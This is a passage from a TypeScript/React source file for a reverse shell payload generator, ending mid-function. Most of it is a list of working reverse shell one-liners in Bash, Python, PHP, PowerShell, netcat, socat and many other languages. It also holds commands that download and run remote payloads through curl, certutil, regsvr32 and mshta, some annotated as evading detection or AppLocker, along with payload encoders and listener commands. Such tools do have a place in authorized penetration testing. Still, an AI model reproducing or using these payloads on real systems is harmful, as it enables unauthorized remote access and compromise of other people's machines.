"use client";

import React, { useState, useEffect, useCallback, useMemo } from "react";

// ─── Types ────────────────────────────────────────────────────────────────────
interface Shell {
  id: string;
  category: string;
  label: string;
  ext: string;
  generate: (ip: string, port: string) => string;
  explain: Record<string, string>;
}

interface Theme {
  name: string;
  accent: string;
  dim: string;
  bg: string;
  panel: string;
  border: string;
  text: string;
  muted: string;
}

interface HistoryEntry {
  payload: string;
  shell: string;
  ts: number;
}

type ThemeKey = "green" | "amber" | "red" | "cyan";
type EncodingKey = "none" | "base64" | "url" | "double-url" | "hex";
type ListenerType =
  | "nc"
  | "ncat"
  | "socat"
  | "socat-pty"
  | "socat-tls"
  | "pwncat";
type TabKey = "payload" | "listener" | "history";

// ─── Shell Definitions ────────────────────────────────────────────────────────
const SHELLS: Shell[] = [
  {
    id: "bash-tcp",
    category: "Bash",
    label: "Bash TCP",
    ext: "sh",
    generate: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    explain: {
      "bash -i": "Start interactive bash",
      ">& /dev/tcp/IP/PORT": "Redirect stdout+stderr to TCP socket",
      "0>&1": "Redirect stdin from same socket",
    },
  },
  {
    id: "bash-udp",
    category: "Bash",
    label: "Bash UDP",
    ext: "sh",
    generate: (ip, port) => `sh -i >& /dev/udp/${ip}/${port} 0>&1`,
    explain: {
      "sh -i": "Start interactive sh",
      ">& /dev/udp/IP/PORT": "Redirect to UDP socket",
    },
  },
  {
    id: "bash-196",
    category: "Bash",
    label: "Bash fd 196",
    ext: "sh",
    generate: (ip, port) =>
      `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
    explain: {
      "exec 196<>": "Open TCP socket as fd 196",
      "sh <&196 >&196 2>&196": "Bind shell I/O to fd 196",
    },
  },
  {
    id: "bash-readline",
    category: "Bash",
    label: "Bash Read Line",
    ext: "sh",
    generate: (ip, port) =>
      `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
    explain: {
      "exec 5<>": "Open socket as fd 5",
      "while read line": "Read commands line by line",
      "$line 2>&5 >&5": "Execute and redirect output back",
    },
  },
  {
    id: "bash-loop",
    category: "Bash",
    label: "Bash Loop",
    ext: "sh",
    generate: (ip, port) =>
      `while true; do bash -i >& /dev/tcp/${ip}/${port} 0>&1; sleep 5; done`,
    explain: {
      "while true": "Persistent reconnect loop",
      "sleep 5": "Wait 5s before reconnecting",
    },
  },
  {
    id: "zsh",
    category: "Zsh",
    label: "Zsh TCP",
    ext: "sh",
    generate: (ip, port) =>
      `zsh -c 'zmodload zsh/net/tcp && ztcp ${ip} ${port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
    explain: {
      "zmodload zsh/net/tcp": "Load zsh TCP module",
      ztcp: "Open TCP connection",
      ">&$REPLY": "Redirect to socket fd",
    },
  },
  {
    id: "python3",
    category: "Python",
    label: "Python3",
    ext: "py",
    generate: (ip, port) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
    explain: {
      "socket.socket(...)": "Create TCP socket",
      "s.connect(...)": "Connect to attacker",
      "os.dup2(...)": "Duplicate socket to stdin/stdout/stderr",
      "pty.spawn": "Spawn PTY shell for full interactivity",
    },
  },
  {
    id: "python2",
    category: "Python",
    label: "Python2",
    ext: "py",
    generate: (ip, port) =>
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    explain: { "subprocess.call": "Execute shell process with duplicated fds" },
  },
  {
    id: "python3-ipv6",
    category: "Python",
    label: "Python3 IPv6",
    ext: "py",
    generate: (ip, port) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("${ip}",${port},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
    explain: { AF_INET6: "Use IPv6 socket family" },
  },
  {
    id: "python3-short",
    category: "Python",
    label: "Python3 Short",
    ext: "py",
    generate: (ip, port) =>
      `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
    explain: { "list comprehension": "Compact dup2 for all fds" },
  },
  {
    id: "php-exec",
    category: "PHP",
    label: "PHP exec",
    ext: "php",
    generate: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    explain: {
      fsockopen: "Open TCP socket",
      exec: "Execute shell with socket fds",
    },
  },
  {
    id: "php-shell_exec",
    category: "PHP",
    label: "PHP shell_exec",
    ext: "php",
    generate: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`,
    explain: { shell_exec: "Alternative PHP execution function" },
  },
  {
    id: "php-system",
    category: "PHP",
    label: "PHP system",
    ext: "php",
    generate: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});system("/bin/sh -i <&3 >&3 2>&3");'`,
    explain: {},
  },
  {
    id: "php-passthru",
    category: "PHP",
    label: "PHP passthru",
    ext: "php",
    generate: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});passthru("/bin/sh -i <&3 >&3 2>&3");'`,
    explain: {},
  },
  {
    id: "php-popen",
    category: "PHP",
    label: "PHP popen",
    ext: "php",
    generate: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});popen("/bin/sh -i <&3 >&3 2>&3", "r");'`,
    explain: {},
  },
  {
    id: "php-proc_open",
    category: "PHP",
    label: "PHP proc_open",
    ext: "php",
    generate: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`,
    explain: { proc_open: "Opens process with custom I/O handles" },
  },
  {
    id: "php-web",
    category: "PHP",
    label: "PHP Web Shell",
    ext: "php",
    generate: (ip, port) =>
      `<?php set_time_limit(0);$ip='${ip}';$port=${port};$sock=fsockopen($ip,$port);$proc=proc_open('/bin/sh -i', array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>`,
    explain: { "set_time_limit(0)": "Prevent PHP timeout" },
  },
  {
    id: "nc-traditional",
    category: "Netcat",
    label: "Netcat -e",
    ext: "sh",
    generate: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
    explain: {
      "nc -e": "Execute program after connect (traditional netcat only)",
    },
  },
  {
    id: "nc-openbsd",
    category: "Netcat",
    label: "Netcat OpenBSD",
    ext: "sh",
    generate: (ip, port) =>
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    explain: {
      "mkfifo /tmp/f": "Create named pipe",
      "cat /tmp/f | sh": "Feed pipe to shell",
      "nc ... >/tmp/f": "Write nc output back to pipe",
    },
  },
  {
    id: "nc-busybox",
    category: "Netcat",
    label: "BusyBox nc",
    ext: "sh",
    generate: (ip, port) => `busybox nc ${ip} ${port} -e sh`,
    explain: { "busybox nc": "BusyBox variant supports -e flag" },
  },
  {
    id: "nc-pipe",
    category: "Netcat",
    label: "Netcat Named Pipe",
    ext: "sh",
    generate: (ip, port) =>
      `rm -f /tmp/p; mknod /tmp/p p && nc ${ip} ${port} 0</tmp/p | /bin/sh > /tmp/p 2>&1`,
    explain: { "mknod /tmp/p p": "Create named pipe node" },
  },
  {
    id: "nc-ncat",
    category: "Netcat",
    label: "ncat",
    ext: "sh",
    generate: (ip, port) => `ncat ${ip} ${port} -e /bin/bash`,
    explain: { ncat: "Nmap's netcat with -e support" },
  },
  {
    id: "ps-tcp",
    category: "PowerShell",
    label: "PowerShell TCP",
    ext: "ps1",
    generate: (ip, port) =>
      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
    explain: {
      TCPClient: "Create .NET TCP client",
      "GetStream()": "Get network stream",
      "iex $data": "Execute received commands",
      "Out-String": "Capture output as string",
    },
  },
  {
    id: "ps-b64",
    category: "PowerShell",
    label: "PowerShell Base64",
    ext: "ps1",
    generate: (ip, port) => {
      const raw = `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      const b64 = btoa(unescape(encodeURIComponent(raw)));
      return `powershell -EncodedCommand ${b64}`;
    },
    explain: {
      "-EncodedCommand":
        "Accept base64 UTF-16LE encoded command, bypasses some detection",
    },
  },
  {
    id: "ps-tls",
    category: "PowerShell",
    label: "PowerShell TLS",
    ext: "ps1",
    generate: (ip, port) =>
      `$sslStream = [System.Net.Security.SslStream]::new([System.Net.Sockets.TcpClient]::new('${ip}',${port}).GetStream());$sslStream.AuthenticateAsClient('${ip}');$writer=[System.IO.StreamWriter]::new($sslStream);$reader=[System.IO.StreamReader]::new($sslStream);while($true){$writer.Write('PS> ');$writer.Flush();$cmd=$reader.ReadLine();if($cmd -eq 'exit'){break};$result=iex $cmd 2>&1|Out-String;$writer.WriteLine($result);$writer.Flush()}`,
    explain: {
      SslStream: "Encrypted shell over TLS",
      AuthenticateAsClient: "TLS handshake",
    },
  },
  {
    id: "ruby-fork",
    category: "Ruby",
    label: "Ruby Fork",
    ext: "rb",
    generate: (ip, port) =>
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    explain: {
      "exit if fork": "Daemonize by forking",
      "IO.popen": "Execute command and capture output",
    },
  },
  {
    id: "ruby-nobash",
    category: "Ruby",
    label: "Ruby No Bash",
    ext: "rb",
    generate: (ip, port) =>
      `ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    explain: {
      to_i: "Get fd integer",
      "exec sprintf": "Execute shell with fd substitution",
    },
  },
  {
    id: "perl-sh",
    category: "Perl",
    label: "Perl /bin/sh",
    ext: "pl",
    generate: (ip, port) =>
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    explain: {
      "use Socket": "Load socket module",
      sockaddr_in: "Build sockaddr struct",
      'open(STDIN,">&S")': "Redirect STDIN to socket",
    },
  },
  {
    id: "perl-pty",
    category: "Perl",
    label: "Perl PTY",
    ext: "pl",
    generate: (ip, port) =>
      `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
    explain: { MIO: "Load IO module inline", fork: "Fork and exit parent" },
  },
  {
    id: "java",
    category: "Java",
    label: "Java Runtime",
    ext: "java",
    generate: (ip, port) =>
      `r = Runtime.getRuntime();\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);\np.waitFor();`,
    explain: {
      "Runtime.getRuntime()": "Get JVM runtime",
      "r.exec([...])": "Execute command array",
      "waitFor()": "Block until process exits",
    },
  },
  {
    id: "golang",
    category: "Go",
    label: "Golang",
    ext: "go",
    generate: (ip, port) =>
      `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
    explain: {
      "net.Dial": "TCP connect",
      "cmd.Stdin/Stdout/Stderr=c": "Bind shell I/O to connection",
    },
  },
  {
    id: "nodejs",
    category: "Node.js",
    label: "Node.js",
    ext: "js",
    generate: (ip, port) =>
      `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${port},"${ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'`,
    explain: {
      'require("net")': "Load net module",
      'cp.spawn("/bin/sh")': "Spawn shell process",
      ".pipe()": "Connect socket streams to shell",
    },
  },
  {
    id: "socat-basic",
    category: "Socat",
    label: "Socat Basic",
    ext: "sh",
    generate: (ip, port) => `socat TCP:${ip}:${port} EXEC:/bin/sh`,
    explain: {
      socat: "Multipurpose relay tool",
      "TCP:IP:PORT": "Connect to attacker",
      "EXEC:/bin/sh": "Execute shell",
    },
  },
  {
    id: "socat-pty",
    category: "Socat",
    label: "Socat PTY",
    ext: "sh",
    generate: (ip, port) =>
      `socat TCP:${ip}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
    explain: {
      pty: "Allocate pseudo-terminal",
      setsid: "New session",
      sane: "Set sane terminal settings",
      sigint: "Pass SIGINT through",
    },
  },
  {
    id: "socat-tls",
    category: "Socat",
    label: "Socat TLS",
    ext: "sh",
    generate: (ip, port) => `socat OPENSSL:${ip}:${port},verify=0 EXEC:/bin/sh`,
    explain: {
      "OPENSSL:": "Use TLS transport",
      "verify=0": "Skip certificate verification",
    },
  },
  {
    id: "awk",
    category: "Awk",
    label: "Awk",
    ext: "sh",
    generate: (ip, port) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; print c; while ((c |& getline) > 0) print $0 |& s; close(c)} while(c != "exit") }}'`,
    explain: {
      "/inet/tcp/0/IP/PORT": "Awk TCP socket syntax",
      "|&": "Awk coprocess pipe",
    },
  },
  {
    id: "lua",
    category: "Lua",
    label: "Lua",
    ext: "lua",
    generate: (ip, port) =>
      `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
    explain: {
      "require('socket')": "Load LuaSocket library",
      "t:connect": "TCP connect",
    },
  },
  {
    id: "openssl",
    category: "OpenSSL",
    label: "OpenSSL",
    ext: "sh",
    generate: (ip, port) =>
      `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ip}:${port} > /tmp/s; rm /tmp/s`,
    explain: {
      "mkfifo /tmp/s": "Named pipe for I/O loop",
      "openssl s_client": "TLS encrypted channel",
      "-quiet": "Suppress handshake output",
    },
  },
  {
    id: "telnet",
    category: "Telnet",
    label: "Telnet",
    ext: "sh",
    generate: (ip, port) =>
      `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | /bin/sh 1>$TF`,
    explain: {
      "mktemp -u": "Generate temp filename (no create)",
      mkfifo: "Create named pipe",
      "telnet ... | /bin/sh": "Pipe telnet to shell",
    },
  },
  {
    id: "curl-bash",
    category: "Download",
    label: "Curl Pipe Bash",
    ext: "sh",
    generate: (ip, port) => `curl http://${ip}:${port}/shell.sh | bash`,
    explain: {
      "curl ... | bash": "Download and execute remotely hosted shell script",
    },
  },
  {
    id: "wget-bash",
    category: "Download",
    label: "Wget Pipe Bash",
    ext: "sh",
    generate: (ip, port) => `wget -O- http://${ip}:${port}/shell.sh | bash`,
    explain: { "wget -O-": "Write to stdout for piping" },
  },
  {
    id: "groovy",
    category: "JVM",
    label: "Groovy",
    ext: "groovy",
    generate: (ip, port) =>
      `String host="${ip}";int port=${port};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);if(p.exitValue()>=0)break;}p.destroy();s.close();`,
    explain: {
      ProcessBuilder: "Spawn process",
      redirectErrorStream: "Merge stderr to stdout",
    },
  },
  {
    id: "r",
    category: "R",
    label: "R Language",
    ext: "r",
    generate: (ip, port) =>
      `r <- rawConnection(raw(0), "r+");zz <- socketConnection(host="${ip}", port=${port}, blocking=TRUE, server=FALSE, open="r+");system("/bin/sh -i",input=readLines(zz), wait=FALSE)`,
    explain: {
      socketConnection: "R TCP socket",
      "system(... input=readLines)": "Execute shell with socket as stdin",
    },
  },
  // ── Kotlin ──
  {
    id: "kotlin",
    category: "Kotlin",
    label: "Kotlin",
    ext: "kt",
    generate: (ip, port) =>
      `import java.io.*;import java.net.*;val s=Socket("${ip}",${port});val p=Runtime.getRuntime().exec("/bin/sh");val pi=p.inputStream;val pe=p.errorStream;val si=s.getInputStream();val so=s.getOutputStream();Thread{pi.copyTo(so)}.start();Thread{pe.copyTo(so)}.start();si.copyTo(p.outputStream)`,
    explain: {
      "Socket(ip,port)": "Open TCP connection",
      "Runtime.exec": "Spawn shell process",
      copyTo: "Stream pipe between socket and process",
    },
  },
  // ── Scala ──
  {
    id: "scala",
    category: "Scala",
    label: "Scala",
    ext: "scala",
    generate: (ip, port) =>
      `import java.io._;import java.net._;val s=new Socket("${ip}",${port});val p=Runtime.getRuntime.exec(Array("/bin/sh","-i"));val is=s.getInputStream;val os=s.getOutputStream;new Thread(new Runnable{def run(){val b=new Array[Byte](1024);var n=0;while({n=is.read(b);n!= -1})p.getOutputStream.write(b,0,n)}}).start();new Thread(new Runnable{def run(){val b=new Array[Byte](1024);var n=0;while({n=p.getInputStream.read(b);n!= -1})os.write(b,0,n)}}).start()`,
    explain: {
      "new Socket(ip,port)": "TCP connection",
      "Runtime.exec(Array(...))": "Spawn shell with args array",
    },
  },
  // ── Crystal ──
  {
    id: "crystal",
    category: "Crystal",
    label: "Crystal",
    ext: "cr",
    generate: (ip, port) =>
      `require "socket";s=TCPSocket.new("${ip}",${port});Process.run("/bin/sh",input:s,output:s,error:s)`,
    explain: {
      "TCPSocket.new": "Open TCP socket",
      "Process.run": "Run shell with socket as I/O",
    },
  },
  // ── Dart ──
  {
    id: "dart",
    category: "Dart",
    label: "Dart",
    ext: "dart",
    generate: (ip, port) =>
      `import 'dart:io';import 'dart:convert';void main(){Socket.connect("${ip}",${port}).then((s){Process.start("/bin/sh",[]).then((p){s.listen((d){p.stdin.add(d);});p.stdout.listen((d){s.add(d);});p.stderr.listen((d){s.add(d);});});});}`,
    explain: {
      "Socket.connect": "Async TCP connect",
      "Process.start": "Spawn shell",
      "s.listen / p.stdout.listen": "Wire up I/O streams",
    },
  },
  // ── Vlang ──
  {
    id: "vlang",
    category: "V",
    label: "V lang",
    ext: "v",
    generate: (ip, port) =>
      `import net;import os;fn main(){mut s:=net.dial_tcp("${ip}:${port}") or{panic(it)};cmd:=os.Command{path:"/bin/sh",args:[]};unsafe{cmd.start() or{panic(it)}};go fn(mut sock net.TcpConn,mut c os.Command)(){mut buf:=[1024]u8{};for{n:=sock.read(mut buf) or{break};c.stdin_write(buf[..n].bytestr()) or{break}}}&cmd,&s);}`,
    explain: {
      "net.dial_tcp": "TCP connect in V",
      "os.Command": "Shell process abstraction",
    },
  },
  // ── Windows CMD ──
  {
    id: "cmd-tcp",
    category: "Windows",
    label: "CMD TCP",
    ext: "bat",
    generate: (ip, port) =>
      `cmd.exe /c "powershell -nop -w hidden -c \\"$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(cmd /c $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()\\""`,
    explain: {
      "cmd.exe /c": "Run command via cmd",
      "Net.Sockets.TCPClient": ".NET TCP socket",
      "cmd /c $d": "Execute each received command via cmd",
    },
  },
  // ── Windows Certutil download ──
  {
    id: "certutil-dl",
    category: "Windows",
    label: "Certutil Download",
    ext: "bat",
    generate: (ip, port) =>
      `certutil.exe -urlcache -split -f http://${ip}:${port}/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe`,
    explain: {
      "certutil -urlcache": "Built-in Windows download utility",
      "-split -f": "Force download to file",
      "%TEMP%\\shell.exe": "Write to temp dir and execute",
    },
  },
  // ── Mshta ──
  {
    id: "mshta",
    category: "Windows",
    label: "Mshta",
    ext: "bat",
    generate: (ip, port) =>
      `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -c """"$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1|Out-String;$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)};$c.Close()"""",0,True")(window.close)")`,
    explain: {
      mshta: "Microsoft HTML Application host — runs VBScript",
      "Wscript.Shell.Run": "Execute command silently",
    },
  },
  // ── Regsvr32 ──
  {
    id: "regsvr32",
    category: "Windows",
    label: "Regsvr32 SCT",
    ext: "bat",
    generate: (ip, port) =>
      `regsvr32 /s /n /u /i:http://${ip}:${port}/shell.sct scrobj.dll`,
    explain: {
      "regsvr32 /i:URL": "Load scriptlet from URL — bypasses applocker",
      "scrobj.dll": "Script Component Runtime — executes .sct files",
    },
  },
  // ── Scala Spark ──
  {
    id: "scala-spark",
    category: "JVM",
    label: "Scala Spark",
    ext: "scala",
    generate: (ip, port) =>
      `import java.io._;import java.net._;val s=new Socket("${ip}",${port});val p=Runtime.getRuntime.exec("/bin/sh");Seq(p.getInputStream,p.getErrorStream).foreach(i=>new Thread{override def run()={val b=new Array[Byte](512);Iterator.continually(i.read(b)).takeWhile(_!= -1).foreach(n=>s.getOutputStream.write(b,0,n))}}.start());val b=new Array[Byte](512);Iterator.continually(s.getInputStream.read(b)).takeWhile(_!= -1).foreach(n=>p.getOutputStream.write(b,0,n))`,
    explain: {
      "Iterator.continually": "Infinite read loop",
      "takeWhile(!= -1)": "Break on EOF",
    },
  },
  // ── Haskell ──
  {
    id: "haskell",
    category: "Haskell",
    label: "Haskell",
    ext: "hs",
    generate: (ip, port) =>
      `module Main where;import Network.Socket;import System.Process;import System.IO;main::IO();main=do{s<-socket AF_INET Stream 0;addr<-inet_addr "${ip}";connect s (SockAddrInet ${port} addr);h<-socketToHandle s ReadWriteMode;hSetBuffering h NoBuffering;(_,_,_,ph)<-createProcess(proc "/bin/sh"[]){std_in=UseHandle h,std_out=UseHandle h,std_err=UseHandle h};waitForProcess ph;return()}`,
    explain: {
      "Network.Socket": "Haskell socket library",
      socketToHandle: "Convert socket to I/O handle",
      createProcess: "Spawn shell with socket handles",
    },
  },
  // ── Tcl ──
  {
    id: "tcl",
    category: "Tcl",
    label: "Tcl",
    ext: "tcl",
    generate: (ip, port) =>
      `set s [socket ${ip} ${port}];fconfigure $s -translation binary -buffering full;set p [open "|/bin/sh -i" r+];fconfigure $p -translation binary -buffering full;fileevent $s readable {puts -nonewline $p [read $s]};fileevent $p readable {puts -nonewline $s [read $p]};vwait forever`,
    explain: {
      "socket ip port": "Open TCP socket",
      'open "|/bin/sh -i"': "Open shell as pipe",
      fileevent: "Event-driven I/O wiring",
    },
  },
  // ── Ncat TLS ──
  {
    id: "ncat-tls",
    category: "Netcat",
    label: "Ncat TLS",
    ext: "sh",
    generate: (ip, port) => `ncat --ssl ${ip} ${port} -e /bin/bash`,
    explain: {
      "--ssl": "Encrypt channel with TLS",
      "-e /bin/bash": "Execute bash after connect",
    },
  },
  // ── Perl Windows ──
  {
    id: "perl-win",
    category: "Perl",
    label: "Perl Windows",
    ext: "pl",
    generate: (ip, port) =>
      `perl -MIO::Socket -e '$s=IO::Socket::INET->new(PeerAddr=>"${ip}:${port}");$ENV{COMSPEC}||="/bin/sh";open(STDIN,">&",\$s);open(STDOUT,">&",\$s);open(STDERR,">&",\$s);exec($ENV{COMSPEC}," /c")'`,
    explain: {
      "IO::Socket::INET": "OO socket interface",
      COMSPEC: "Windows shell env var fallback",
    },
  },
  // ── Python Windows ──
  {
    id: "python-win",
    category: "Python",
    label: "Python Windows",
    ext: "py",
    generate: (ip, port) =>
      `python -c "import socket,subprocess;s=socket.socket();s.connect(('${ip}',${port}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"`,
    explain: {
      "cmd.exe": "Windows shell",
      "subprocess.call with socket": "Bind cmd I/O to socket",
    },
  },
  // ── PHP PentestMonkey ──
  {
    id: "php-pentest-monkey",
    category: "PHP",
    label: "PHP PentestMonkey",
    ext: "php",
    generate: (ip, port) =>
      `<?php\nset_time_limit(0);\n$VERSION="1.0";\n$ip='${ip}';\n$port=${port};\n$chunk_size=1400;\n$write_a=null;\n$error_a=null;\n$shell='uname -a; w; id; /bin/sh -i';\n$daemon=0;\n$debug=0;\nif(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){exit(1);}if($pid){exit(0);}}\n$sock=fsockopen($ip,$port,$errno,$errstr,30);\nif(!$sock){exit(1);}\n$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));\n$process=proc_open($shell,$descriptorspec,$pipes);\nif(!is_resource($process)){exit(1);}\nfwrite($sock,"Connected!\\n");\nwhile(!feof($sock)){$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){$input=fread($sock,$chunk_size);fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){$input=fread($pipes[1],$chunk_size);fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){$input=fread($pipes[2],$chunk_size);fwrite($sock,$input);}}\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n?>`,
    explain: {
      pcntl_fork: "Fork to background/daemonize",
      stream_select: "Multiplex socket and process I/O",
      proc_open: "Full bidirectional process I/O",
    },
  },
];

const COMMON_PORTS: number[] = [4444, 1337, 9001, 443, 80, 8080, 31337, 6666];

const THEMES: Record<ThemeKey, Theme> = {
  green: {
    name: "Green",
    accent: "#00ff41",
    dim: "#00aa28",
    bg: "#0a0f0a",
    panel: "#0d140d",
    border: "#1a2e1a",
    text: "#c8ffc8",
    muted: "#4a7a4a",
  },
  amber: {
    name: "Amber",
    accent: "#ffb300",
    dim: "#cc8800",
    bg: "#0f0e0a",
    panel: "#14120d",
    border: "#2e2a1a",
    text: "#fff3c8",
    muted: "#7a6a4a",
  },
  red: {
    name: "Red",
    accent: "#ff3131",
    dim: "#cc0000",
    bg: "#0f0a0a",
    panel: "#140d0d",
    border: "#2e1a1a",
    text: "#ffc8c8",
    muted: "#7a4a4a",
  },
  cyan: {
    name: "Cyan",
    accent: "#00eeff",
    dim: "#00aabb",
    bg: "#0a0f0f",
    panel: "#0d1414",
    border: "#1a2e2e",
    text: "#c8ffff",
    muted: "#4a7a7a",
  },
};

// ─── Encoding Utils ───────────────────────────────────────────────────────────
function encodePayload(payload: string, method: EncodingKey): string {
  switch (method) {
    case "base64":
      return btoa(payload);
    case "url":
      return encodeURIComponent(payload);
    case "double-url":
      return encodeURIComponent(encodeURIComponent(payload));
    case "hex":
      return Array.from(payload)
        .map((c) => c.charCodeAt(0).toString(16).padStart(2, "0"))
        .join("");
    default:
      return payload;
  }
}

// ─── Listener Generator ───────────────────────────────────────────────────────
function getListener(port: string, type: ListenerType): string {
  switch (type) {
    case "nc":
      return `nc -lvnp ${port}`;
    case "ncat":
      return `ncat -lvp ${port}`;
    case "socat":
      return `socat -d -d TCP-LISTEN:${port},reuseaddr,fork STDOUT`;
    case "socat-pty":
      return `socat -d -d TCP-LISTEN:${port},reuseaddr FILE:\`tty\`,raw,echo=0`;
    case "socat-tls":
      return `# Generate cert first:\nopenssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt\n# Then listen:\nsocat OPENSSL-LISTEN:${port},cert=server.crt,key=server.key,verify=0 FILE:\`tty\`,raw,echo=0`;
    case "pwncat":
      return `pwncat-cs -lp ${port}`;
    default:
      return `nc -lvnp ${port}`;
  }
}

// ─── Syntax Highlight ─────────────────────────────────────────────────────────
function highlightPayload(payload: string, accent: string): string {
  const ips = payload.replace(
    /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g,
    `<span style="color:${accent};font-weight:bold">$1</span>`,
  );
  return ips.replace(/\b(\d{2,5})\b/g, (m, n) => {
